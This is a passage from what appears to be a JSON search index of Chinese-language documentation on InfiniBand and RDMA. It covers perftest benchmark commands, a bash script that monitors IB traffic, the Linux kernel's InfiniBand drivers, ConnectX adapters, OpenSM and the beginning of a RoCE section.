\u7684\u67d0\u4efd\u6587\u6863\uff08\u5fd8\u6389\u662f\u54ea\u4efd\u4e86\uff09\u4e2d\u770b\u5230\u4e86\u8fd9\u6837\u7684\u5199\u6cd5\uff1a</p> <pre><code>id:20 + \u786c\u4ef6\u5730\u5740\u540e 8 \u5bf9\u5341\u516d\u8fdb\u5236\u6570\u5b57\n</code></pre> <p>\u8fd9\u662f\u53ef\u884c\u7684\u3002</p>"},{"location":"optimization/HPN/#benchmark","title":"Benchmark","text":"<p><code>perftest</code> \u8f6f\u4ef6\u5305\u7531 <code>linux-rdma</code> \u7ef4\u62a4\uff0c\u7528\u4e8e\u6d4b\u8bd5 InfiniBand \u6027\u80fd\uff0c\u53ef\u7528\u4e8e RoCE\u3002</p> <pre><code># \u5ba2\u6237\u7aef\nib_write_lat --ib-dev=mlx5_0 --ib-port=1 MAX01-ib -a -R\n# \u670d\u52a1\u7aef\nib_write_lat --ib-dev=mlx5_0 --ib-port=1 -R -a\n\nib_send_lat     latency test with send transactions\nib_send_bw      bandwidth test with send transactions\nib_write_lat    latency test with RDMA write transactions\nib_write_bw     bandwidth test with RDMA write transactions\nib_read_lat     latency test with RDMA read transactions\nib_read_bw      bandwidth test with RDMA read transactions\nib_atomic_lat   latency test with atomic transactions\nib_atomic_bw    bandwidth test with atomic transactions\n</code></pre>"},{"location":"optimization/HPN/#iproute2","title":"iproute2","text":"<p>\u5f3a\u5927\u7684 iproute2 \u540c\u6837\u652f\u6301\u4e86 RDMA \u7f51\u7edc\u63a5\u53e3\u7684\u7ba1\u7406\uff0c\u63d0\u4f9b\u4e86 <code>rdma</code> \u547d\u4ee4\uff0c\u8bed\u6cd5\u4e0e <code>ip</code> \u547d\u4ee4\u7c7b\u4f3c\uff1a</p> <pre><code>ip link\nrdma link\n</code></pre>"},{"location":"optimization/HPN/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>\u4e00\u4e2a\u7528\u4e8e\u770b IB \u5361\u5b9e\u65f6\u6d41\u91cf\u7684\u811a\u672c\uff1a</p> <pre><code>#!/bin/bash\n\n# Author: Chen Jinlong\n# Usage: ib_monitor.sh [interval]\n\ndeclare -A old_recv_bytes;\ndeclare -A old_recv_packets;\ndeclare -A old_xmit_bytes;\ndeclare -A old_xmit_packets;\n\ninterval=$1\nif [ -z $interval ]; then\n    interval=1\nfi\n\nfor ib_dev in $(ls /sys/class/infiniband/); do\n    counter_dir=\"/sys/class/infiniband/$ib_dev/ports/1/counters\"\n    old_recv_bytes[$ib_dev]=$(cat $counter_dir/port_rcv_data)\n    old_recv_packets[$ib_dev]=$(cat $counter_dir/port_rcv_packets)\n    old_xmit_bytes[$ib_dev]=$(cat $counter_dir/port_xmit_data)\n    old_xmit_packets[$ib_dev]=$(cat $counter_dir/port_xmit_packets)\ndone\n\nwhile true; do\n    printf \"%-10s %12s %12s %12s %12s\\n\" Device recv_MBps recv_kpps xmit_MBps xmit_kpps\n    for ib_dev in $(ls /sys/class/infiniband/); do\n        counter_dir=\"/sys/class/infiniband/$ib_dev/ports/1/counters\"\n        new_recv_bytes=$(cat $counter_dir/port_rcv_data)\n        new_recv_packets=$(cat $counter_dir/port_rcv_packets)\n        new_xmit_bytes=$(cat $counter_dir/port_xmit_data)\n        new_xmit_packets=$(cat $counter_dir/port_xmit_packets)\n\n        recv_MBps=$(echo \"scale=2; ( $new_recv_bytes - ${old_recv_bytes[$ib_dev]} ) / 256.0 / 1024.0 / $interval\" | bc)\n        recv_kpps=$(echo \"scale=2; ( $new_recv_packets - ${old_recv_packets[$ib_dev]} ) / 1000.0 / $interval\" | bc)\n        xmit_MBps=$(echo \"scale=2; ( $new_xmit_bytes - ${old_xmit_bytes[$ib_dev]} ) / 256.0 / 1024.0 / $interval\" | bc)\n        xmit_kpps=$(echo \"scale=2; ( $new_xmit_packets - ${old_xmit_packets[$ib_dev]} ) / 1000.0 / $interval\" | bc)\n\n        printf \"%-10s %12s %12s %12s %12s\\n\" $ib_dev $recv_MBps $recv_kpps $xmit_MBps $xmit_kpps\n\n        old_recv_bytes[$ib_dev]=$new_recv_bytes\n        old_recv_packets[$ib_dev]=$new_recv_packets\n        old_xmit_bytes[$ib_dev]=$new_xmit_bytes\n        old_xmit_packets[$ib_dev]=$new_xmit_packets\n    done\n    printf \"\\n\"\n\n    sleep $interval\ndone\n</code></pre>"},{"location":"optimization/HPN/#\u7528\u6237\u7a7a\u95f4\u5e93","title":"\u7528\u6237\u7a7a\u95f4\u5e93","text":"<p>\u9605\u8bfb  linux-rdma/rdma-core \u7684\u7b80\u4ecb\u3002</p>"},{"location":"optimization/HPN/#linux-infiniband-\u8f6f\u4ef6\u7ed3\u6784","title":"Linux InfiniBand \u8f6f\u4ef6\u7ed3\u6784","text":"<p>Quote</p> <ul> <li>InfiniBand - The Linux Kernel</li> <li>InfiniBand Software on Linux - Oracle</li> <li>Developing a Linux Kernel module using RDMA for GPUDirect - NVIDIA</li> </ul> <p>Linux \u5185\u6838\u4e2d\u7684 InifiniBand \u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u5c42\u6b21\uff1a</p> <ul> <li>HCA Driver</li> <li>Core InfiniBand Modules</li> <li>Upper Level Protocols</li> </ul>"},{"location":"optimization/HPN/#rdma-verb","title":"RDMA Verb","text":""},{"location":"optimization/HPN/#infiniband-verb","title":"InfiniBand Verb","text":""},{"location":"optimization/HPN/#ipoib","title":"IPoIB","text":"<p>Quote</p> <ul> <li>Transmission of IP over InfiniBand (IPoIB) - RFC 4391</li> <li>IP over InfiniBand (IPoIB) Architecture - RFC 4392</li> <li>IP over InfiniBand - The Linux Kernel</li> </ul> <p>Linux \u5185\u6838\u63d0\u4f9b <code>ib_ipoib</code> \u9a71\u52a8\u3002</p>"},{"location":"optimization/HPN/#nfs-over-rdma","title":"NFS over RDMA","text":""},{"location":"optimization/HPN/#\u5185\u6838\u5b50\u7cfb\u7edf","title":"\u5185\u6838\u5b50\u7cfb\u7edf","text":"<p>\u9605\u8bfb  linux/drivers/infiniband\u3002</p>"},{"location":"optimization/HPN/#\u786c\u4ef6\u9a71\u52a8-hw","title":"\u786c\u4ef6\u9a71\u52a8 <code>hw</code>","text":"<p>\u4f60\u53ef\u4ee5\u5728 <code>hw</code> \u4e0b\u770b\u5230\u8fd9\u91cc\u4e0d\u4ec5\u6709 InfiniBand \u9a71\u52a8\uff0c\u8fd8\u6709 RoCE \u548c iWARP \u7b49\u9a71\u52a8\u3002\u4ee3\u7801\u6ce8\u91ca\u3001\u5185\u6838\u6a21\u5757\u7684 Description \u4e2d\u4f1a\u8bf4\u660e\u8fd9\u662f\u54ea\u4e2a\u5382\u5546\u7684\u9a71\u52a8\u3002\u4e0b\u9762\u4e3e\u4e00\u4e9b\u5e38\u89c1\u7684\u4f8b\u5b50\uff1a</p> <ul> <li>InfiniBand<ul> <li><code>mlx4</code>: Mellanox ConnectX HCA InfiniBand driver</li> <li><code>mlx5</code>: Mellanox 5th generation network adapters (ConnectX series) IB driver</li> <li><code>mthca</code>: Mellanox InfiniBand HCA low-level driver</li> </ul> </li> <li>RoCE<ul> <li><code>erdma</code>\uff1a\u6765\u81ea\u963f\u91cc\u5df4\u5df4</li> <li><code>hns</code>\uff1a\u6765\u81ea\u534e\u4e3a\u6d77\u601d</li> <li><code>irdma</code>: Linux* RDMA Driver for the E800 Series and X722 Intel(R) Ethernet Controllers</li> </ul> </li> <li>iWARP<ul> <li><code>cxgb3</code></li> </ul> </li> </ul> <p>\u6b64\u5916\u4f60\u53ef\u80fd\u5728\u8fdc\u53e4\u6587\u6863\u4e2d\u770b\u89c1\u8fc7 <code>amso</code>\u3001<code>ipath</code> \u7b49\u9a71\u52a8\u3002\u5b83\u4eec\u5df2\u7ecf\u56e0\u4e3a\u505c\u6b62\u7ef4\u62a4\u800c\u88ab\u79fb\u51fa\u5185\u6838\u6e90\u7801\u6811\u3002</p> <p><code>mthca</code> \u7528\u4e8e\u8fdc\u53e4\u7684 InfiniHost \u7cfb\u5217\u4ea7\u54c1\u3002MLNX_OFED \u6587\u6863 \u8be6\u7ec6\u89e3\u91ca\u4e86 <code>mlx4</code> \u548c <code>mlx5</code> \u8fd9\u4e24\u4e2a\u9a71\u52a8\u3002\u4e0b\u56fe\u5c55\u793a\u4e86\u8fd9\u4e9b\u9a71\u52a8\u6a21\u5757\u5de5\u4f5c\u7684\u4f4d\u7f6e\u3002</p> Mellanox ConnectX \u9a71\u52a8 Mellanox OFED User Manual <ul> <li>CX-3 \u548c CX-3 Pro \u5bf9\u5e94 <code>mlx4</code>\uff0c\u5176\u540e\u7684\u4ea7\u54c1\u5bf9\u5e94 <code>mlx5</code>\u3002</li> <li>CX-3 \u65e2\u53ef\u4ee5\u5de5\u4f5c\u5728 InfiniBand \u6a21\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u5de5\u4f5c\u5728 Ethernet \u6a21\u5f0f\u3002\u56e0\u6b64 <code>mlx4</code> \u5206\u4e3a\u51e0\u4e2a\u6a21\u5757\uff1a<ul> <li><code>mlx4_core</code></li> <li><code>mlx4_ib</code></li> <li><code>mlx4_en</code>\uff0c\u4f4d\u4e8e <code>drivers/net/ethernet/mellanox/mlx4</code>\u3002</li> </ul> </li> <li>\u5176\u540e\u7684\u4ea7\u54c1\u4e5f\u53ef\u4ee5\u5de5\u4f5c\u5728 InfiniBand \u548c Ethernet \u6a21\u5f0f\uff0c\u4f46\u4ee5\u592a\u7f51\u529f\u80fd\u88ab\u5408\u5e76\u5230 <code>core</code> \u4e2d\uff0c\u56e0\u6b64\u4e0d\u9700\u8981 <code>mlx5_en</code>\uff08\u867d\u7136\u8fd9\u4e2a\u9a71\u52a8\u786e\u5b9e\u5b58\u5728\u4e8e <code>drivers/net/ethernet/mellanox/mlx5</code> \u4e2d\uff09\uff1a<ul> <li><code>mlx5_core</code></li> <li><code>mlx5_ib</code></li> </ul> </li> </ul> <p>MLNX_OFED \u6587\u6863\u4e2d\u8fd8\u6709\u9a71\u52a8\u7684\u53c2\u6570\u7b49\uff0c\u53ef\u4ee5\u53c2\u8003\u3002</p>"},{"location":"optimization/HPN/#\u8f6f\u4ef6\u9a71\u52a8-sw","title":"\u8f6f\u4ef6\u9a71\u52a8 <code>sw</code>","text":"<ul> <li><code>rxe</code>\uff1a\u8f6f\u4ef6\u5b9e\u73b0\u7684 RoCE\u3002</li> <li><code>siw</code>\uff1aSoft iWARP\uff0c\u8f6f\u4ef6\u5b9e\u73b0\u7684 iWARP\u3002</li> <li> <p><code>rdmavt</code>\uff1aRDMA Verbs Transport Library\u3002\u7528\u4e8e\u7edf\u4e00\u786c\u4ef6\u9a71\u52a8\u7684\u4e00\u5c42\uff0c\u793a\u610f\u56fe\u5982\u4e0b\uff1a</p> <p></p>      RDMA Verbs Transport Library Creating a Common Software Verbs Implementation - OpenFabrics Alliance <p></p> <p>\u4e3e\u4e00\u4e2a\u5177\u4f53\u7684\u4f5c\u7528\uff1a<code>rdmavt</code> \u4ee3\u8868\u9a71\u52a8\u8c03\u7528 <code>ib_register_device()</code> \u6ce8\u518c\u8bbe\u5907\u3002</p> <p>\u8be6\u7ec6\u89e3\u91ca\u89c1 Creating a Common Software Verbs Implementation - OpenFabrics Alliance\u3002</p> </li> </ul>"},{"location":"optimization/HPN/#\u4e0a\u5c42\u534f\u8bae-ulp","title":"\u4e0a\u5c42\u534f\u8bae <code>ulp</code>","text":"<p>\u5728\u524d\u6587 InfiniBand \u534f\u8bae\u6808 \u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86 Upper Layer Protocols \u7528\u4e8e\u5c06 InfiniBand \u8fde\u63a5\u5230\u5e38\u7528\u7684\u63a5\u53e3\u3002\u5728 <code>ulp</code> \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u534f\u8bae\u7684\u5177\u4f53\u5b9e\u73b0\u3002\u5176\u4e2d\u503c\u5f97\u63a2\u7a76\u7684\u6709\uff1a</p> <ul> <li><code>ipoib</code></li> </ul> <p>NFS over RDMA \u867d\u7136\u4e5f\u662f\u4e00\u4e2a ULP\uff0c\u4f46\u5b83\u4f3c\u4e4e\u5b9e\u73b0\u5728 IPoIB \u4e0a\uff0c\u56e0\u6b64\u4e0d\u51fa\u73b0\u5728\u8fd9\u91cc\u3002</p>"},{"location":"optimization/HPN/#\u6838\u5fc3\u6a21\u5757-core","title":"\u6838\u5fc3\u6a21\u5757 <code>core</code>","text":"<p>Quote</p> <ul> <li>InfiniBand and Remote DMA (RDMA) Interfaces \u2014 The Linux Kernel documentation</li> </ul> <p>TODO</p>"},{"location":"optimization/HPN/#\u786c\u4ef6","title":"\u786c\u4ef6","text":"<p>\u524d\u6587\u8bed\u5883\u4e2d\u7684 RDMA \u6307\u7684\u662f\u4e00\u79cd\u673a\u5236\u3002\u8003\u8651\u5176\u5177\u4f53\u5b9e\u73b0\uff0c\u5c31\u6d89\u53ca\u5230\u591a\u79cd\u6280\u672f\u3002\u73b0\u6709\u7684 RDMA \u6280\u672f\u5305\u62ec RoCE\uff08RDMA over Converged Ethernet\uff09\u3001InfiniBand\u3001iWARP \u7b49\u3002</p>      RDMA \u6280\u672f\u67b6\u6784\u6bd4\u8f83 \u6d45\u6790 RoCE \u7f51\u7edc\u6280\u672f - \u817e\u8baf\u4e91 <ul> <li>InfiniBand\uff1a\u4e13\u4e3a RDMA \u8bbe\u8ba1\u7684\u7f51\u7edc\u6280\u672f\uff0c\u4ece\u786c\u4ef6\u7ea7\u522b\u4fdd\u8bc1\u53ef\u9760\u4f20\u8f93\u3002\u9700\u8981\u4e13\u95e8\u7684\u7f51\u7edc\u9002\u914d\u5668\u3001\u4ea4\u6362\u673a\u3002</li> <li>RoCE \u548c iWARP\uff1a\u90fd\u662f\u57fa\u4e8e\u4ee5\u592a\u7f51\u7684 RDMA \u6280\u672f\uff0cRoCE \u4f7f\u7528 UDP \u534f\u8bae\uff0ciWARP \u4f7f\u7528 TCP \u534f\u8bae\u3002<ul> <li>Soft RoCE\uff1a\u53ef\u4ee5\u4ee5 Soft RoCE \u7684\u65b9\u5f0f\uff08\u4f7f\u7528 <code>rxe</code> \u9a71\u52a8\uff09\u8fd0\u884c\u5728\u666e\u901a\u4ee5\u592a\u7f51\u4e0a\uff0c\u4f46\u5728\u5e26\u5bbd\u548c\u5ef6\u8fdf\u4e0a\u90fd\u548c\u666e\u901a\u4ee5\u592a\u7f51\u6ca1\u4ec0\u4e48\u5dee\u522b\uff08\u89c1 Comparing Ethernet and soft Roce over 1 gigabit ethernet using osu benchmark - IJCSIT\uff09\u3002</li> <li>\u805a\u5408\u4ee5\u592a\u7f51\uff08Converged Ethernet\uff09\uff1a\u771f\u6b63\u7684 RoCE \u5c31\u548c\u5b83\u5168\u540d\u63cf\u8ff0\u7684\u4e00\u6837\uff0c\u9700\u8981\u4ea4\u6362\u673a\u548c\u7f51\u7edc\u9002\u914d\u5668\u652f\u6301\u805a\u5408\u4ee5\u592a\u7f51\u3002\u8fd9\u662f\u7531 IEEE DCB \u5de5\u4f5c\u7ec4\u63d0\u51fa\u7684\u4e00\u7ec4\u589e\u5f3a\u6807\u51c6\uff08\u6bd4\u5982 802.Qbb \u6d41\u63a7\u3001802.Qaz \u4f20\u8f93\u9009\u62e9\u3001802.Qau \u62e5\u585e\u63a7\u5236\u7b49\uff09\u7ec4\u6210\u7684\uff0c\u6709\u4e24\u5927\u76ee\u7684\uff1a<ol> <li>\u5c06\u5b58\u50a8\u3001\u901a\u4fe1\u3001\u8ba1\u7b97\u7b49\u6d41\u91cf\uff08\u5982 iSCSI\u3001FCoE\u3001RDMA\uff09\u6574\u5408\u5230\u4e00\u5957\u5171\u4eab\u7684\u4ee5\u592a\u7f51\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u8fd9\u5c31\u662f\u201c\u805a\u5408\u201d\u7684\u610f\u601d\u3002</li> <li>\u652f\u6301\u4e0d\u4e22\u5305\u4f20\u8f93\uff0c\u4ece\u800c\u652f\u6301\u5bf9\u4f20\u8f93\u53ef\u9760\u6027\u8981\u6c42\u6781\u9ad8\u7684\u670d\u52a1\uff08\u6bd4\u5982 RDMA\uff09\u3002</li> </ol> </li> </ul> </li> <li>\u5176\u4ed6\u4e13\u6709\u6280\u672f\uff1a\u5982 Intel \u7684 Omni-Path\u3002</li> </ul>"},{"location":"optimization/HPN/#infiniband","title":"InfiniBand","text":"<p>Quote</p> <ul> <li>RDMA - Debian Wiki</li> <li>OFED for Linux \u2013 OpenFabrics Alliance</li> <li>InfiniBand In-Network Computing Technology and Roadmap - Mellanox</li> </ul> <p>\u4e0b\u9762\u4e24\u5f20\u56fe\u662f InfiniBand \u6280\u672f\u6808\u3002\u53ef\u4ee5\u770b\u5230 InfiniBand \u662f\u4e00\u5957\u7cfb\u7edf\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5305\u542b\u7f51\u7edc\u9002\u914d\u5668\u3001\u4ea4\u6362\u673a\u3001SoC\u3001\u7ebf\u7f06\u548c\u8f6f\u4ef6\u751f\u6001\u3002</p>      InfiniBand \u6280\u672f\u8def\u7ebf     \u5de6 2015 \u5e74\uff0c\u53f3 2019 \u5e74 Mellanox Touts Arrival of Intelligent Interconnect - HPC Wire InfiniBand In-Network Computing Technology and Roadmap - MVAPICH <ul> <li>\u63d0\u4f9b\u5546\uff1aNVIDIA Mellanox \u4ec5\u6b64\u4e00\u5bb6\u3002</li> <li> <p>\u5185\u6838\u652f\u6301\u60c5\u51b5\uff1a</p> <ul> <li>\u5b50\u7cfb\u7edf\uff1aLinux \u5185\u6838\u5c06 InfiniBand \u4f5c\u4e3a\u4e00\u4e2a\u9a71\u52a8\u5b50\u7cfb\u7edf\u63d0\u4f9b\u652f\u6301\uff0c\u89c1 InfiniBand and Remote DMA (RDMA) Interfaces \u2014 The Linux Kernel documentation\u3002</li> <li> <p>\u7528\u6237\u7a7a\u95f4\uff1a\u53ea\u6709\u5185\u6838\u63a5\u53e3\u662f\u4e0d\u591f\u7684\uff0c\u8fd8\u9700\u8981\u7528\u6237\u7a7a\u95f4\u7684\u5e93\u548c\u5de5\u5177\u3002\u5185\u6838\u56e2\u961f\u7ef4\u62a4\u4e86\u4e00\u5957\u7528\u6237\u7a7a\u95f4\u5e93\u548c\u5de5\u5177\uff0c\u89c1  linux-rdma/rdma-core: RDMA core userspace libraries and daemons\u3002</p> <p>\u5b83\u63d0\u4f9b\u4e86\u4e24\u4e2a\u91cd\u8981\u7684\u5e93\uff08\u5305\u542b C/C++ \u548c Python \u7ed1\u5b9a\uff09\uff0c\u5927\u591a\u6570 RDMA \u5e94\u7528\u90fd\u57fa\u4e8e\u5b83\u4eec\u5f00\u53d1\uff1a</p> <ul> <li><code>librdmacm</code>\uff1a\u4f7f\u7528 IP \u5bfb\u5740\u5efa\u7acb\u8fde\u63a5\uff0c\u6bd4 <code>libibverbs</code> \u62bd\u8c61\u7a0b\u5ea6\u66f4\u9ad8\uff0c\u5bf9\u4e8e\u5199\u8fc7 socket \u7a0b\u5e8f\u7684\u4eba\u6765\u8bf4\u66f4\u5bb9\u6613\u4e0a\u624b\u3002</li> <li><code>libibverbs</code>\uff1a\u63d0\u4f9b\u5176\u4ed6\u63a7\u5236\u548c\u6570\u636e\u901a\u8def\u64cd\u4f5c\uff0c\u5b9e\u73b0 InfiniBand Trade Association\uff08IBTA\uff09\u5b9a\u4e49\u7684\u62bd\u8c61\u63a5\u53e3\u3002</li> </ul> <p></p>      RDMA \u6808      RDMA Tutorial - Netdev <p></p> </li> </ul> <p>Info</p> <p>\u8fd9\u4e5f\u5c31\u662f\u8bf4 Linux \u4e0d\u5b89\u88c5\u5382\u5546\u7684\u9a71\u52a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 InfiniBand\u3002\u6bd4\u5982 NVIDIA \u505c\u6b62\u4e86 ConnectX-3 \u5728 Debian 10 \u4e4b\u540e\u7684 MLNX_OFED \u7248\u672c\u7684\u652f\u6301\uff0c\u4f46\u7528\u5185\u6838\u4e2d\u7684 rdma-core \u7b49\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u3002\u901a\u8fc7 rdma-core\uff0c\u6211\u4eec\u5728 Debian 12 \u4e2d\u6210\u529f\u4f7f\u7528\u4e86 ConnectX-3 \u5361\u3002</p> </li> <li> <p>\u4ea7\u5546\u652f\u6301\uff1a</p> <ul> <li>OpenFabrics\uff1aOFA \u8054\u76df\u8d1f\u8d23\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001\u8bb8\u53ef\u3001\u652f\u6301\u548c\u5206\u53d1 RDMA/\u5148\u8fdb\u7f51\u7edc\u8f6f\u4ef6\uff0c\u76ee\u6807\u662f\u4fc3\u8fdb\u5148\u8fdb\u7f51\u7edc\u67b6\u6784\u7684\u53d1\u5c55\u4e0e\u666e\u53ca\u3002\u6210\u5458\u5305\u62ec Mellanox\u3001HUAWEI\u3001Intel\u3001IBM\u3001Red Hat\u3001Microsoft \u7b49\u5382\u5546\u548c SNIA \u7b49\u6807\u51c6\u7ec4\u7ec7\u3002OpenFabrics \u66fe\u7ecf\u662f OpenIB Alliance\uff0c\u4f46\u540e\u6765\u6269\u5c55\u652f\u6301\u4e86 iWARP\u3001RoCE \u7b49\u3002</li> <li>OpenFabrics Enterprise Distribution\uff08OFED\uff09\uff1a\u4ea7\u5546\u4eec\u4ece linux-rdma \u62c9\u53d6\u6e90\u4ee3\u7801\uff0c\u9488\u5bf9\u81ea\u5df1\u7684\u4ea7\u54c1\u8fdb\u884c\u4f18\u5316\u3001\u4fee\u6539\u3001\u6253\u8865\u4e01\u7b49\u3002\u975e\u5e38\u91cd\u8981\u7684\u662f\u5b83\u63d0\u4f9b\u4e86\u5185\u6838\u65c1\u8def\uff08kernel bypass\uff09\u529f\u80fd\uff0c\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u786c\u4ef6\u8d44\u6e90\uff0c\u6781\u5927\u63d0\u9ad8\u6027\u80fd\u3002\u6b64\u5916\uff0c\u9002\u914d\u5668\u548c\u7ebf\u7f06\u7b49\u7684\u56fa\u4ef6\u66f4\u65b0\u4e5f\u9700\u8981\u4ea7\u5546\u7684\u5de5\u5177\u3002</li> </ul> <p>Warning</p> <p>MLNX_OFED \u5df2\u7ecf\u505c\u6b62\u652f\u6301\uff0c\u5c06\u8f6c\u79fb\u5230 DOCA-OFED\u3002</p> </li> </ul>"},{"location":"optimization/HPN/#infiniband-\u786c\u4ef6","title":"InfiniBand \u786c\u4ef6","text":"<p>InfiniBand \u6807\u51c6\u4e2d\u5b9a\u4e49\u7684\u786c\u4ef6\u7ec4\u6210\u90e8\u5206\u6709\uff1a</p> <ul> <li>Host Channel Adapter\uff08HCA\uff09\uff1a\u53ef\u4ee5\u7406\u89e3\u4e3a\u7f51\u7edc\u9002\u914d\u5668\u3002</li> <li>Target Channel Adapter\uff08TCA\uff09\uff1a\u53ef\u4ee5\u7406\u89e3\u4e3a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u7f51\u7edc\u9002\u914d\u5668\u3002</li> <li>Switch\uff1a\u5b9e\u73b0\u4e86 InfiniBand \u94fe\u8def\u5c42\u6d41\u63a7\u7684\u4ea4\u6362\u673a\uff0c\u80fd\u591f\u4e0d\u4e22\u5305\u4f20\u8f93\u3002</li> <li>Router\uff1a\u7528\u4e8e\u5927\u578b\u7f51\u7edc\u3002IB \u7ba1\u7406\u67b6\u6784\u4ee5\u5b50\u7f51\u4e3a\u5355\u4f4d\uff0c\u901a\u8fc7\u8def\u7531\u5668\u5206\u9694\u5b50\u7f51\u80fd\u591f\u51cf\u5c11\u7ba1\u7406\u6d41\u91cf\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u7684\u4f20\u8f93\u3002</li> <li>Cable and Connector\uff1a</li> </ul>"},{"location":"optimization/HPN/#host-channel-adapter","title":"Host Channel Adapter","text":"<p>\u7f51\u7edc\u9002\u914d\u5668</p> <p>NVIDIA Mellanox \u5236\u9020\u7684\u7f51\u7edc\u9002\u914d\u5668\u7cfb\u5217\u540d\u79f0\u4e3a ConnectX\u3002\u8fd9\u4e9b\u7f51\u7edc\u9002\u914d\u5668\u4e00\u822c\u652f\u6301 InfiniBand \u6216 RoCE \u6a21\u5f0f\uff0c\u53ef\u7075\u6d3b\u914d\u7f6e\u3002</p> Feature ConnectX-3 ConnectX-4 ConnectX-5 ConnectX-6 ConnectX-7 Speed 56Gb/s 100Gb/s 100Gb/s 200Gb/s 400Gb/s Connector QSFP28 QSFP56 OSFP, QSFP112 PCIe x8 Gen3 x8, x16 Gen3 Gen3/4 x16 Gen3/4 x16 Gen4/5 x16 IB RDMA / RoCE IB RDMA, RoCE* IB RDMA, RoCE IB RDMA, RoCE IB RDMA, RoCE IB RDMA, RoCE SR-IOV Supported Supported Supported Supported Supported <p>\u8fd9\u5f20\u8868\u6765\u81ea Mellanox Adapters - Comparison Table \u4ee5\u53ca Networking-datasheet-InfiniBand-Adapter-Cards---web--1549706.pdf (widen.net)\u3002</p> <p>NVIDIA \u662f InfiniBand \u6280\u672f\u7684\u552f\u4e00\u4f9b\u5e94\u5546\uff0c\u76ee\u524d\u5176\u4ed6\u5382\u5bb6\u6700\u591a\u53ea\u80fd\u5236\u9020 IB \u7ebf\u7f06\u3002\u800c RoCE \u6280\u672f\u5219\u6709\u4f17\u591a ICT \u5382\u5546\u652f\u6301\uff0c\u5982 Cisco\u3001\u534e\u4e3a\u3001Juniper \u7b49\u3002</p>"},{"location":"optimization/HPN/#\u7ebf\u7f06","title":"\u7ebf\u7f06","text":"<p>InfiniBand \u7ebf\u7f06\u7aef\u5b50\u4e0a\u6709 EEPROM \u82af\u7247\uff0c\u53ef\u4ee5\u5b58\u50a8\u7ebf\u7f06\u7684\u4fe1\u606f\uff0c\u5982\u957f\u5ea6\u3001\u578b\u53f7\u3001\u5e8f\u5217\u53f7\u7b49\u3002</p>"},{"location":"optimization/HPN/#\u4ea4\u6362\u673a","title":"\u4ea4\u6362\u673a","text":""},{"location":"optimization/HPN/#infiniband-\u534f\u8bae\u6808","title":"InfiniBand \u534f\u8bae\u6808","text":"<p>Quote</p> <ul> <li>Presentation:<ul> <li>(2013)InfiniBand Architecture Overview - SNIA</li> <li>(2008)InfiniBand Technology Overview - SNIA</li> </ul> </li> <li>White Paper:<ul> <li>(2003)Introduction to InfiniBand\u2122 - NVIDIA</li> <li>(2010)Introduction to InfiniBand\u2122 for End Users - NVIDIA</li> </ul> </li> <li>Specification: (2007)InfiniBand Architecture Release 1.2.1 - ENEA</li> </ul> <p>\u8ba9\u6211\u4eec\u5ffd\u7565\u8d1f\u8d23\u8def\u7531\u7684\u7f51\u7edc\u5c42\u53ca\u66f4\u4f4e\u5c42\u6b21\uff0c\u4ece Transport Layer \u5f00\u59cb\u3002\u5728\u4f20\u8f93\u5c42\u4e2d\uff0cInfiniBand \u53cc\u7aef\u5efa\u7acb\u6d88\u606f\u961f\u5217\uff08Queue Pair\uff09\u8fdb\u884c\u901a\u4fe1\u3002\u5b9a\u4e49\u4ee5\u4e0b Transport Functions\uff1aSEND\u3001RDMA Write\u3001RDMA Read\u3001ATOMIC\u3001Memory Binding\u3002\u8fd9\u4e9b\u64cd\u4f5c\u5728\u4e0d\u540c\u670d\u52a1\u7b49\u7ea7\uff08Transport Service Level\uff09\u4e2d\u7684\u53ef\u7528\u6027\u4e0d\u540c\u3002</p> <p>SM\uff1a\u5b50\u7f51\u7ba1\u7406\u5668\u3002The InfiniBand Subnet Manager (SM) is a centralized entity running in the switch. The SM discovers and configures all the InfiniBand fabric devices to enable traffic flow between those devices. \u6bcf\u4e2a IB \u7f51\u7edc\u4e2d\u90fd\u9700\u8981\u4e00\u4e2a SM\uff0c\u5426\u5219 ibstat \u4e00\u76f4\u4f1a\u5904\u4e8e Initializing \u7684\u72b6\u6001\u3002\u5728 Switchless IB Network \u4e2d\uff0c\u5176\u4e2d\u7684\u4e00\u53f0\u673a\u5668\u5e94\u5f53\u542f\u52a8 OpenSM\uff08\u5728 LInux Kernel \u4e2d\uff0c\u4e00\u822c\u53d1\u884c\u7248\u90fd\u4f1a\u5e26\uff09\u3002\u7528 sudo \u542f\u52a8 opensm\uff0c\u6216\u8005\u7528 systemctl \u542f\u52a8 opensmd.service \u5373\u53ef\u3002</p> <pre><code>The installation of OpenSM includes:\nsbin/\n   opensm - the SM/SA executable\n   osmtest - a test program for the SM/SA\nlib/\n   libosmcomp.{a,so} - component library with generic services and containers\n   libopensm.{a,so} - opensm services for logs and mad buffer pool\n   libosmvendor.{a,so} - interface to the user mad service of the driver\ninclude/\n   iba/ib_types.h - IBA types header file\n   complib/ - component library includes\n   vendor/  - vendor library includes\n   opensm/  - public opensm library includes\n</code></pre>"},{"location":"optimization/HPN/#roce","title":"RoCE","text":"Quote <ul> <li>\u7aef\u5230\u7aef RoCE \u6982\u5ff5\u539f\u7406\u4e0e\u90e8\u7f72\u8c03\u4f18\uff1a\u5927\u90e8\u5206\u662f\u5b9e\u9645\u64cd\u4f5c\uff0c\u6ca1\u6709\u6e05\u6670\u7684\u7406\u8bba\u8bb2\u89e3\u3002</li> </ul> <p>RoCE \u534f\u8bae\u5b58\u5728 RoCEv1 \u548c RoCEv2 \u4e24\u4e2a\u7248\u672c\uff0c\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u7f51\u7edc\u9002\u914d\u5668\u3002</p> <ul> <li>RoCE v1\uff1a\u57fa\u4e8e\u4ee5\u592a\u7f51\u94fe\u8def\u5c42\u5b9e\u73b0\u7684 RDMA 